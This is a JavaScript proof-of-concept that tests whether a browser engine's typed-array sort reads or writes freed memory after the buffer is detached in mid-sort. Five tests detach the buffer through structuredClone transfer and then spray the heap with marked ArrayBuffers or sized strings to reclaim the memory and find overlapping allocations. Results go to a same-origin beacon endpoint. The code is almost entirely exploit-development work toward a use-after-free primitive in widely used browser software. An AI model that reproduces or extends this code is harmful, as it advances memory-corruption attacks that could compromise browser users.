// p215 — Prove whether sort reads from reclaimed memory or a local copy
//
// CONFLICT: Source says sort copies to local Vector. Device shows zeros
// (not our 0xAAAAAAAA). If sort reads from reclaimed memory, we can
// spray controlled data and the comparator will see it.
//
// Test A: Spray DEADFACE after detach — if comparator sees it, RECLAIM PROVEN
// Test B: Don't spray at all — if comparator sees zeros, memory was zeroed/freed
// Test C: Spray with per-buffer IDs — find which buffer overlaps
// Test D: Check if sort WRITES to the overlapping buffer
// Test E: String reclaim — non-zero non-calloc data
//
// Beacon prefix: V215-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V215-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');
  var tests = [];
  var currentTest = 0;

  // ── TEST A: Magic spray — THE DEFINITIVE TEST ──
  // If sort reads DEADFACE from the comparator, it's reading reclaimed memory.
  // If it reads 0xAAAAAAAA, it's reading a local copy.
  // If it reads 0x00000000, memory was freed+zeroed but not reclaimed by our spray.
  tests.push({name: 'A-MAGIC', run: function(done) {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xAAAAAAAA;

    var detached = false;
    var cmp = 0;
    var vals = [];
    var MAGIC = 0xDEADFACE;

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // Light spray — 500 buffers filled with DEADFACE
          for (var i = 0; i < 500; i++) {
            var s = new ArrayBuffer(4096);
            var sv = new Uint32Array(s);
            for (var j = 0; j < sv.length; j++) sv[j] = MAGIC;
          }
          B('A-SPRAYED');
        }
        if (detached && vals.length < 40) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var deadCount = 0, aaCount = 0, zeroCount = 0, otherCount = 0;
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === MAGIC) deadCount++;
        else if (vals[i] === 0xAAAAAAAA) aaCount++;
        else if (vals[i] === 0) zeroCount++;
        else otherCount++;
      }
      B('A-CMP' + cmp + '-VALS' + vals.length);
      B('A-DEAD-' + deadCount);
      B('A-ORIG-' + aaCount);
      B('A-ZERO-' + zeroCount);
      B('A-OTHER-' + otherCount);

      // Report first 8 actual values
      for (var k = 0; k < Math.min(8, vals.length); k++) {
        B('A-V' + k + '-' + hex(vals[k]));
      }
    } catch (e) {
      B('A-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST B: No spray control — what does sort see naturally? ──
  tests.push({name: 'B-NOSPR', run: function(done) {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xBBBBBBBB;

    var detached = false;
    var cmp = 0;
    var vals = [];

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // NO spray — just detach and observe
          B('B-DETACHED');
        }
        if (detached && vals.length < 40) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var bbCount = 0, zeroCount = 0, otherCount = 0;
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === 0xBBBBBBBB) bbCount++;
        else if (vals[i] === 0) zeroCount++;
        else otherCount++;
      }
      B('B-CMP' + cmp);
      B('B-ORIG-' + bbCount);
      B('B-ZERO-' + zeroCount);
      B('B-OTHER-' + otherCount);

      for (var k = 0; k < Math.min(8, vals.length); k++) {
        B('B-V' + k + '-' + hex(vals[k]));
      }
    } catch (e) {
      B('B-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST C: Overlapping buffer detection ──
  // Spray with per-buffer unique markers. After sort, scan spray buffers
  // for modifications. If the sort WROTE to one, that's the overlap.
  tests.push({name: 'C-OVERLAP', run: function(done) {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var view = new Uint32Array(ab);
    // Descending values to force swaps
    for (var i = 0; i < view.length; i++) view[i] = view.length - i;

    var detached = false;
    var cmp = 0;
    var spray = [];

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // Spray with unique per-buffer marker at offset 0
          for (var i = 0; i < 500; i++) {
            var s = new ArrayBuffer(4096);
            var sv = new Uint32Array(s);
            sv[0] = 0xF0000000 | i; // unique marker
            sv[1] = 0xF0000000 | i;
            // Rest stays zero
            spray.push(s);
          }
          B('C-SPRAYED-' + spray.length);
        }
        if (detached) {
          return b - a; // force max swaps
        }
        return a - b;
      });

      B('C-CMP' + cmp);

      // Scan spray for modifications
      var modified = [];
      for (var i = 0; i < spray.length; i++) {
        var sv = new Uint32Array(spray[i]);
        var marker = sv[0];
        var expected = 0xF0000000 | i;
        if (marker !== expected) {
          modified.push({idx: i, val0: hex(sv[0]), val1: hex(sv[1]), val2: hex(sv[2]), val3: hex(sv[3])});
        }
      }
      B('C-MODIFIED-' + modified.length);
      for (var j = 0; j < Math.min(5, modified.length); j++) {
        var m = modified[j];
        B('C-MOD-' + m.idx + '-' + m.val0 + '_' + m.val1 + '_' + m.val2 + '_' + m.val3);
      }
    } catch (e) {
      B('C-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST D: Write confirmation — fill spray, check post-sort ──
  // Fill spray buffers completely with known pattern.
  // If sort writes descending values into the overlapping buffer,
  // we'll see non-pattern values = WRITE CONFIRMED.
  tests.push({name: 'D-WRITE', run: function(done) {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = view.length - i;

    var detached = false;
    var cmp = 0;
    var spray = [];

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // Fill spray completely with 0x42424242
          for (var i = 0; i < 500; i++) {
            var s = new ArrayBuffer(4096);
            var sv = new Uint32Array(s);
            for (var j = 0; j < sv.length; j++) sv[j] = 0x42424242;
            spray.push(s);
          }
          B('D-SPRAYED');
        }
        if (detached) return b - a;
        return a - b;
      });

      B('D-CMP' + cmp);

      // Find any spray buffer with non-0x42424242 values
      var found = false;
      for (var i = 0; i < spray.length; i++) {
        var sv = new Uint32Array(spray[i]);
        for (var j = 0; j < sv.length; j++) {
          if (sv[j] !== 0x42424242) {
            found = true;
            B('D-WRITE-FOUND-BUF' + i + '-OFF' + j);
            // Dump first 16 modified values
            var dump = [];
            for (var k = j; k < Math.min(j + 16, sv.length); k++) {
              if (sv[k] !== 0x42424242) dump.push(k + ':' + hex(sv[k]));
            }
            B('D-DUMP-' + dump.join('_'));
            break;
          }
        }
        if (found) break;
      }
      if (!found) B('D-NO-WRITES');
    } catch (e) {
      B('D-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST E: String reclaim — non-zero data from StringImpl ──
  tests.push({name: 'E-STRREC', run: function(done) {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var view = new Uint32Array(ab);
    for (var i = 0; i < view.length; i++) view[i] = 0xEEEEEEEE;

    var detached = false;
    var cmp = 0;
    var vals = [];
    var strings = [];

    try {
      view.sort(function(a, b) {
        cmp++;
        if (cmp === 50 && !detached) {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
          // Spray with strings that are ~4076 chars (4096 - 20 byte StringImpl header)
          for (var i = 0; i < 500; i++) {
            strings.push('P'.repeat(4076));
          }
          B('E-STRSPRAYED');
        }
        if (detached && vals.length < 60) {
          vals.push(a >>> 0);
        }
        return 0;
      });

      var eeCount = 0, zeroCount = 0, pCount = 0, otherCount = 0;
      var otherVals = [];
      for (var i = 0; i < vals.length; i++) {
        if (vals[i] === 0xEEEEEEEE) eeCount++;
        else if (vals[i] === 0) zeroCount++;
        else if (vals[i] === 0x50505050) pCount++; // 'PPPP' in ASCII
        else {
          otherCount++;
          if (otherVals.length < 10) otherVals.push(hex(vals[i]));
        }
      }
      B('E-CMP' + cmp);
      B('E-ORIG-' + eeCount);
      B('E-ZERO-' + zeroCount);
      B('E-PSTR-' + pCount);
      B('E-OTHER-' + otherCount);
      for (var m = 0; m < otherVals.length; m++) {
        B('E-OVAL-' + otherVals[m]);
      }
    } catch (e) {
      B('E-ERR-' + e.name);
    }
    done();
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 15000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
